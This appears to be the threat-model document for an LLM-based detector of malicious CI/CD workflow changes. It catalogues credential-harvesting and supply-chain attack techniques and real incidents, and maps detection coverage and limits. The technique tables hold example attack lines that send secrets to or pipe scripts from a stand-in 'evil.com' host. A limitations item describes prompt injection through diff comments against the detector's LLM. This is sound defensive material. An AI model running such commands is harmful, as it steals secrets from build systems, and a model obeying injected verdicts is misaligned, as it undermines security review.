# Threat Model

## Primary Threat: Credential Harvesting via CI/CD Pipeline Manipulation

The most common and highest-impact real-world CI/CD attack chain:

```
Attacker steals developer credentials (phishing, token leak, session hijack)
  → Modifies .github/workflows/deploy.yml (or creates new workflow)
  → Adds exfiltration of secrets available in CI environment
  → Workflow runs with access to all repository secrets
  → Attacker harvests credentials for lateral movement
```

### Why This Is Threat #1

CI/CD environments are high-value targets because they hold:
- **Cloud credentials** (AWS, GCP, Azure access keys and OIDC tokens)
- **Package registry tokens** (npm, PyPI, Maven, Docker Hub)
- **Code signing keys** (macOS certificates, GPG keys)
- **Deploy keys** (SSH keys for production infrastructure)
- **API tokens** (GitHub PATs, Slack webhooks, database credentials)
- **OIDC tokens** (via `id-token: write` permission + `ACTIONS_ID_TOKEN_REQUEST_URL`)

A single compromised workflow can exfiltrate all of these simultaneously.

---

## Threat Categories

### 1. Credential Harvesting

Direct exfiltration of secrets from CI environment.

| Technique | Example | Real-World Incident |
|-----------|---------|---------------------|
| HTTP exfiltration | `curl -d "${{ secrets.KEY }}" https://evil.com` | GhostAction (2025) |
| Artifact leakage | Upload `.git/` dir containing `GITHUB_TOKEN` | ArtiPACKED (2024) |
| Memory scraping | Read `/proc/<pid>/mem` to extract runner credentials | Trivy/Aqua TeamPCP (2026) |
| Environment dump | `printenv` or `env` to log all secrets | Common in script kiddie attacks |
| Output forwarding | Write secrets to `$GITHUB_OUTPUT` for downstream job exfil | Sophisticated multi-job chains |
| OIDC token request | Obtain cloud OIDC tokens via `ACTIONS_ID_TOKEN_REQUEST_URL` | Permission escalation to cloud |

### 2. Privileged Trigger Abuse

Exploiting trigger types that grant elevated permissions.

| Trigger | Risk | Real-World Incident |
|---------|------|---------------------|
| `pull_request_target` | Runs with base branch secrets but can execute PR code | Grafana (2025), Orca (2024), Synacktiv (2024) |
| `workflow_run` | Inherits privileges of triggering workflow | GitHub Security Lab (2025) |
| `issue_comment` | Can be triggered by any user who can comment | GitHub Security Lab IssueOps patterns |

The canonical exploitation: `pull_request_target` + `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` = untrusted code execution with trusted secrets.

### 3. Permission Escalation

Broadening workflow permissions beyond what's needed.

| Change | Impact |
|--------|--------|
| Adding `permissions: write-all` | Grants full read-write access to all GitHub APIs |
| Adding `id-token: write` | Enables OIDC token requests for cloud provider auth |
| Adding `contents: write` | Can modify repository contents, create releases |
| Removing explicit `permissions:` block | Falls back to broad default token permissions |

### 4. Runner Targeting

Redirecting jobs to environments with elevated access.

| Change | Impact |
|--------|--------|
| `runs-on: self-hosted` | Self-hosted runners often have network access to internal systems |
| Custom runner labels | May target runners with specific cloud credentials or VPN access |
| `container: attacker/image` | Pre-planted malware in container image |

### 5. Supply Chain Manipulation

Modifying dependencies and external inputs.

| Technique | Example | Real-World Incident |
|-----------|---------|---------------------|
| Mutable action refs | `uses: actions/setup-node@main` | tj-actions (CVE-2025-30066) |
| Upstream action compromise | Malicious code in trusted action | reviewdog (CVE-2025-30154) |
| Remote script execution | `curl https://evil.com/script.sh \| bash` | Codecov (2021) |
| Dependency poisoning | Malicious npm/PyPI package in CI | Axios (2026), LiteLLM (2026) |
| Artifact poisoning | Modified artifact consumed by downstream workflow | GitHub Security Lab patterns |

### 6. Defense Evasion via Commit Timestamp Manipulation

Git allows commit authors to set arbitrary dates via `GIT_AUTHOR_DATE` and `GIT_COMMITTER_DATE`. Attackers exploit this to make malicious commits appear old and trusted.

| Technique | Risk | Detection |
|-----------|------|-----------|
| Backdated `GIT_AUTHOR_DATE` | File appears untouched for years on GitHub; reviewers skip it | Compare author date vs. current date; flag commits >90 days old in current PRs |
| Author/committer date discrepancy | Author sets fake old date, but committer date reflects actual commit time | Flag gaps >7 days between author and committer timestamps |
| History rewrite via force-push | Entire file history replaced with backdated commits | `backdated_commits` signal combined with `first_time_contributor` |

**Real-world examples:**
- **XCTDH/DEV#POPPER (2026):** DPRK-linked campaign documented by [KL4R10N](https://kl4r10n.tech/blog/when-git-history-lies) — four public GitHub repos (`ReactCosmosDelegationUI`, `CertificateVerification`, `covid-sk`, `scads-io/frontend`) had obfuscated JavaScript loaders appended to framework config files (`nwb.config.js`, `truffle.js`, `vue.config.js`, `next.config.js`). The ReactCosmosDelegationUI commit claims a date of 2019-07-08, but the embedded payload references Aptos mainnet infrastructure that didn't launch until October 2022 — proving the timestamp was spoofed. The loaders retrieve payloads from TRON/Aptos/BSC blockchain transactions.
- **Commit-date spoofing PoC:** [pcaversaccio/test-spoof-commit-date](https://github.com/pcaversaccio/test-spoof-commit-date) demonstrates the technique using `GIT_AUTHOR_DATE` and `GIT_COMMITTER_DATE` environment variables.

**Why GitHub is vulnerable:** GitHub's file browser displays the author date (not the committer date) for "last modified" timestamps. A backdated commit makes a malicious file look like it hasn't been touched in years, bypassing visual review. As KL4R10N notes: "content-based analysis beats timestamp-based trust when repository history appears inconsistent with the embedded infrastructure."

**Detection approach:** The analysis bundle includes `analysis_date` (ISO 8601 UTC) so the LLM can compute temporal distance between commit author dates and the current time. The `backdated_commits` signal fires when author dates are >90 days old or when author/committer date gaps exceed 7 days.

**Severity guidance:**

| Combination | Severity |
|-------------|----------|
| `backdated_commits` alone | **High** — active evasion technique (MITRE T1070.006) |
| `backdated_commits` + `secrets_context` | **Critical** — evasion combined with credential harvesting |
| `backdated_commits` + `first_time_contributor` | **High** — unknown actor hiding activity timeline |
| `backdated_commits` + obfuscated code | **Critical** — matches XCTDH/DEV#POPPER TTP |

---

## Real-World Incident Analysis

### GhostAction (2025)
**Source:** GitGuardian research
**Chain:** Compromised maintainer accounts → inject workflows that POST secrets to attacker endpoints
**Detection:** Signal pre-screen catches `secrets.*` + `curl`. LLM identifies credential harvesting pattern.

### ForceMemo (2026)
**Source:** StepSecurity research
**Chain:** Account takeover → force-push malware into Python source files (`setup.py` with malicious `cmdclass`/`subprocess` calls)
**Detection:** Detected — monitors packaging files (`setup.py`, `setup.cfg`, `pyproject.toml`). Signal pre-screen catches `setup_py_command`. LLM evaluates packaging hook manipulation.

### Grafana (2025)
**Source:** Grafana security blog
**Chain:** `pull_request_target` + script injection via crafted branch name → bot credential exfiltration
**Detection:** Signal pre-screen catches `pull_request_target`. LLM evaluates trigger + injection risk.

### Trivy/Aqua TeamPCP (2026)
**Source:** Aqua Security / Wiz / Palo Alto research
**Chain:** `pull_request_target` initial vector → exfil org secrets → compromised service account pushes malicious releases. Payload reads `/proc/<pid>/mem` to scrape credentials that bypass GitHub log masking.
**Detection:** Signal pre-screen catches `pull_request_target`, `secrets_context`, `proc_mem_read`.

### tj-actions/changed-files (CVE-2025-30066, 2025)
**Source:** Wiz / CISA advisory
**Chain:** Attacker gained write access to action repo → retroactively modified version tags → malicious commit scanned runner memory for credentials
**Detection:** Partial — catches mutable-tag action references. Cannot detect retroactive tag modification on upstream repos.

### reviewdog/action-setup (CVE-2025-30154, 2025)
**Source:** CISA advisory
**Chain:** Compromised upstream action via overly permissive org access → dumped CI secrets to logs
**Detection:** Out of scope — consumer's workflow file is unchanged.

### Codecov Bash Uploader (2021)
**Source:** Codecov post-mortem
**Chain:** Attacker modified hosted bash script at `codecov.io/bash` → script exfiltrated env vars via curl
**Detection:** Partial — catches `curl | bash` patterns added to workflows. Cannot detect modification of already-referenced external scripts.

### ArtiPACKED (2024)
**Source:** Palo Alto Unit 42
**Chain:** Artifact upload of checkout directory leaks `.git/config` containing `GITHUB_TOKEN`. Race condition allows token use before job completion.
**Detection:** Catches workflow changes that introduce artifact uploads of sensitive directories.

### Synacktiv Research (2024)
**Source:** Synacktiv security blog
**Chain:** Comprehensive `pull_request_target` exploitation including Dependabot app abuse → compromised Spring Security, trpc
**Detection:** `pull_request_target` + checkout of untrusted ref triggers analysis.

### GitHub Security Lab Patterns (2025)
**Source:** securitylab.github.com
**Chain:** Three patterns: `pull_request_target` TOCTOU + cache poisoning, `workflow_run` privilege escalation, `issue_comment` IssueOps bypass
**Detection:** All three dangerous triggers are pre-screened and LLM evaluates full context.

### Orca "Pull Request Nightmare" (2024)
**Source:** Orca Security blog
**Chain:** `pull_request_target` + `actions/checkout` with `ref: github.event.pull_request.head.sha` → RCE + secret exfil from Google, Microsoft repos
**Detection:** The exact pattern is a primary detection target.

### Axios npm Compromise (2026)
**Source:** Google GTIG / Socket / OpenAI
**Chain:** North Korean actor socially engineered maintainer → malicious npm v1.14.1 with WAVESHAPER.V2 → OpenAI's CI signing pipeline auto-installed it → macOS code-signing certificates exposed
**Detection:** Partial — catches PR changes to dependency installation steps. Cannot detect upstream npm package compromise.

### LiteLLM/Telnyx PyPI Compromise (2026)
**Source:** PyPI blog / Datadog / Snyk
**Chain:** TeamPCP stole PyPI credentials via compromised Trivy CI → published malicious LiteLLM → harvested SSH keys, cloud creds, K8s configs from 6,943+ machines (33k secrets exposed)
**Detection:** Partial — catches dependency installation changes. The initial Trivy vector (`pull_request_target`) is fully detected.

---

## Coverage Summary

| # | Incident | Year | Attack Technique | Detection |
|---|----------|------|------------------|-----------|
| 1 | **GhostAction** | 2025 | Compromised accounts inject workflows that POST secrets to external endpoints | **Detected** |
| 2 | **ForceMemo** | 2026 | Account takeover + force-push malicious `setup.py` with install hooks | **Detected** (monitors packaging files) |
| 3 | **Grafana** | 2025 | `pull_request_target` + script injection via crafted branch name | **Detected** |
| 4 | **Trivy/Aqua TeamPCP** | 2026 | `pull_request_target` → org secret exfil → `/proc/<pid>/mem` credential scraping | **Detected** |
| 5 | **tj-actions** (CVE-2025-30066) | 2025 | Retroactive tag modification on popular action → runner memory scanning | Partial (catches mutable refs) |
| 6 | **reviewdog** (CVE-2025-30154) | 2025 | Compromised upstream action via overly permissive org access | Out of scope (no local change) |
| 7 | **Codecov** | 2021 | Hosted bash script modified to exfil env vars | Partial (catches `curl \| bash`) |
| 8 | **ArtiPACKED** | 2024 | Artifact upload of checkout directory leaks `.git` with GITHUB_TOKEN | **Detected** |
| 9 | **Synacktiv** | 2024 | `pull_request_target` + Dependabot app abuse | **Detected** |
| 10 | **GitHub Security Lab** | 2025 | `workflow_run` escalation, `issue_comment` IssueOps bypass, TOCTOU cache poisoning | **Detected** |
| 11 | **Orca** | 2024 | `pull_request_target` + PR head checkout → RCE in Google/Microsoft repos | **Detected** |
| 12 | **Axios** | 2026 | Compromised npm package consumed by CI signing pipeline | Partial (catches `package.json`/lockfile changes) |
| 13 | **LiteLLM** | 2026 | Compromised PyPI package via stolen CI credentials → mass credential harvesting | Partial (catches `pyproject.toml`/lockfile changes; initial vector detected) |
| 14 | **Shai-Hulud** | 2025 | npm supply chain worm: silent install, `gh auth token` harvest, TruffleHog scanning | **Detected** |
| 15 | **XCTDH/DEV#POPPER** | 2026 | DPRK-linked commit-date spoofing: backdated commits hide malicious config file modifications | **Detected** (commit timestamp analysis) |

**Summary: 10 fully detected, 4 partially detected, 1 out of scope.**

### XCTDH/DEV#POPPER Commit-Date Spoofing (2026)
**Source:** KL4R10N research / Ransom-ISAC / eSentire
**Chain:** DPRK-linked actors trojanize public GitHub repos by appending obfuscated JavaScript loaders to framework config files (`nwb.config.js`, `truffle.js`, `vue.config.js`, `next.config.js`). Commits are backdated using `GIT_AUTHOR_DATE`/`GIT_COMMITTER_DATE` to make files appear years old. The loaders use TRON/Aptos/BSC blockchain infrastructure to retrieve and execute payloads. `ReactCosmosDelegationUI` shows a "2019" commit date for code that references Aptos (launched October 2022).
**Detection:** `backdated_commits` signal fires when commit author dates are >90 days old in a current PR, or when author/committer date discrepancy exceeds 7 days. Combined with `setup_py_command` or `postinstall_script` signals for config file manipulation.

---

## Limitations

### Scope Limitations

The detector operates on **diffs to CI/CD, build, release, and packaging files within the repository**. It cannot detect:

1. **Upstream action/dependency compromise** — The consumer's workflow file doesn't change (tj-actions, reviewdog). Mitigation: pin actions to SHA.
2. **Upstream package compromise** — A trusted npm/PyPI package is poisoned (Axios, LiteLLM). Mitigation: lockfiles, checksum verification.
3. **Retroactive tag/branch modification** — An attacker repoints existing tags on an action repo. Mitigation: SHA pinning.
4. **External script modification** — A hosted script referenced by URL is modified server-side (Codecov). Mitigation: script checksums.
5. **Source code attacks** — Malware injected into application source files outside the monitored path set. Add custom paths via `CI_CD_ABUSE_EXTRA_PATHS` to extend coverage.

### Operator guide: diff-only and external limits

These are **not** failures of the model inside a run—they are **inherent to diff-only analysis** of files you choose to monitor. Use configuration where it helps; use **process and org controls** where it cannot.

| Scenario | Can the detector “see” it? | What to do |
|----------|-----------------------------|------------|
| **Paths outside the default filter** | Only if a changed file matches the template’s tiers **or** your extra patterns. | **Inventory** every path that can change how CI runs (extra workflow dirs, `Makefile`, `Taskfile`, IaC that drives pipelines, custom script locations). Set **`CI_CD_ABUSE_EXTRA_PATHS`** to a comma-separated list of path fragments (see [GitHub setup — Extra path patterns](github.md#extra-path-patterns)). Re-open a test PR touching each critical path and confirm this workflow runs. |
| **Injection via PR title, body, branch name, or comment** with **no** change to monitored files | **No** — there is no workflow diff; the job often **does not run**. Even when it runs, the bundle is built from **file diffs**, not live PR metadata. | Prefer **engineering hygiene**: avoid passing `${{ github.event.pull_request.* }}` (and similar) into steps that handle secrets or run shell; use **branch protection**, required reviewers, and manual review for high-risk workflows. The `context_injection` prescreen label only fires when the **workflow text** references those event fields. |
| **Reusable workflow or composite action defined in another repository** | **Consumer diff** usually shows only `uses: org/repo/.github/workflows/...` or `uses: org/repo@v1` — **not** the callee body. | **Pin actions and reusable workflows to full commit SHAs**, maintain **org-level allowlists**, and review changes in **callee** repos with the same rigor (or a second instance of this detector there). |
| **Upstream action, tag, or package compromise** with **no** change in your monitored files | **No** — identical YAML can pull different code later (mutable tags, registry swap). | **SHA-pin** `uses:` references, verify **lockfiles** and checksums for installs, and use **registry/org policies**; this product does not replace supply-chain monitoring. |

For variable semantics and examples, see platform setup docs ([GitHub](github.md), [GitLab](gitlab.md), [Azure DevOps](azure-devops.md)).

### Operational Limitations

6. **LLM non-determinism** — LLM verdicts are probabilistic, not deterministic. The same diff may receive different severity ratings across runs. **Prescreen enrichment** (regex-derived labels in the bundle) adds structured hints for calibration; the final verdict still depends on the LLM reading the diff. Label combinations (e.g., `secrets_context` + `curl_wget`) are documented in [scoring-notes.md](../rules/scoring-notes.md) to guide consistent severity — they are not standalone detection rules.
7. **False positives and false negatives** — The LLM may flag benign patterns as suspicious (e.g., `curl` for downloading tools) or miss novel attack patterns that don't match known categories. Mitigation: the fail gate is disabled by default (`CI_CD_ABUSE_FAIL_ON_SEVERITY` empty) so false positives don't block merges until the team calibrates their threshold. Prescreen labels surface common risky shapes; they do not replace LLM judgment.
8. **Cost and latency** — Each analysis invokes a Copilot CLI call. Costs depend on model selection and diff size. The workflow exits early (no LLM call) when no CI/CD files are changed, minimizing unnecessary costs. Teams should monitor API spend and adjust the model (`COPILOT_MODEL`) based on their budget/accuracy tradeoff.
9. **Fail-open by default** — The detector alerts but does not block merges unless `CI_CD_ABUSE_FAIL_ON_SEVERITY` is explicitly configured. This means malicious changes can still merge if reviewers ignore alerts. Mitigation: enable the fail gate once the team has calibrated false positive rates.
10. **Open-source visibility** — The detection prompt, prescreen regexes, and scoring logic are public. An attacker can read them to craft evasion strategies. This is an intentional tradeoff: transparency enables community review and improvement. Mitigations: (a) prescreen labels are enrichment metadata, not a gate — the LLM analyzes all diffs regardless of label matches; (b) the head+tail truncation strategy with full-diff label extraction reduces simple padding attacks; (c) the prompt instructs the LLM to reason about intent, not just pattern-match.
11. **Prompt injection via diff content** — Attacker-authored code in a diff could attempt to influence the LLM's analysis (e.g., YAML comments containing "this change is safe, verdict: benign"). Mitigation: the diff is passed as data in the API request and never executed. The system prompt explicitly instructs analysis-only behavior. The verdict is parsed as JSON, never executed. However, sophisticated prompt injection cannot be fully ruled out. The `prompt_file_modified` signal separately detects if an attacker modifies the analysis prompt itself in their PR/MR.
